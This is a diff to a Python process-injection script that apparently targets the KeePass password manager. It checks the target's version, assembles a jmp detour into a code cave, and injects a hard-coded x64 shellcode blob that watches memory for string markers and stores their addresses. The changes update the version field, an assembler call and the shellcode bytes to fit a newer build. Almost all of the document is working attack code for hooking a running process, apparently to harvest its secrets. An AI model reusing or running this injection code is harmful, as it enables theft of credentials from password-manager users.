@@ -43,9 +43,9 @@ target = invade.Target(target_pid)
 # Check for compatibility
 if target.is_x64 and not me.is_x64:
     print(f'Warning: {target_name} is 64-bit. Use Python 64-bit instead.')
-if target.version_info['file_version_2'] != target_version:
+if target.version_info['file_version_1'] != target_version:
     print(f'Warning: untested {target_name} version: '
-          f'{target.version_info["file_version_2"]}')
+          f'{target.version_info["file_version_1"]}')
 
 # Initialize tool
 tool = invade.Tool()
@@ -119,23 +119,23 @@ if target_detour_address_check != 'C64424':
         sys.exit(f'Error: unexpected instruction found at '
                  f'{hex(target_detour_address)}')
 
-# Convert detour written in assembly to opcodes
-target_shellcode_detour = tool.get_opcodes(f'''
+# Convert detour written in assembly to machine code bytes
+target_shellcode_detour = tool.get_mc(target.is_x64, f'''
 jmp {target_module_address_code_cave}    
 ''', target_detour_address)
 if not target_shellcode_detour:
     sys.exit('Error: Unable to assemble instructions')
 
-# For simplicity, the following string is used instead of Tool.get_opcodes().
+# For simplicity, the following string is used instead of Tool.get_mc().
 # See invade_keepass_shellcode.txt for shellcode assembly instructions.
 # Note: Multiline Ultimate Assembler for x64dbg often assembles with extra 90
 # instructions (NOP).
 target_shellcode_main = '''
 C6 44 24 60 00 48 3D 00 10 00 00 7C 5E 90 90 90 90 48 83 FB 01 74 3E 90 90 90 
 90 48 81 FB 00 10 00 00 7C 47 90 90 90 90 48 3B C3 74 3E 90 90 90 90 83 3B 00 
-74 35 90 90 90 90 81 38 2D 00 2D 00 74 29 90 90 90 90 48 A3 64 D9 39 8A F8 7F 
-00 00 EB 19 90 90 90 81 38 7B 5C 72 74 75 0E 90 90 90 90 48 A3 5C D9 39 8A F8 
-7F 00 00 E9 94 A4 99 FF
+74 35 90 90 90 90 81 38 2D 00 2D 00 74 29 90 90 90 90 48 A3 A4 D6 AD 33 F8 7F 
+00 00 EB 19 90 90 90 81 38 7B 5C 72 74 75 0E 90 90 90 90 48 A3 9C D6 AD 33 F8 
+7F 00 00 E9 F4 19 A0 FF
 '''
 
 # Inject the shellcode prior to injecting the detour
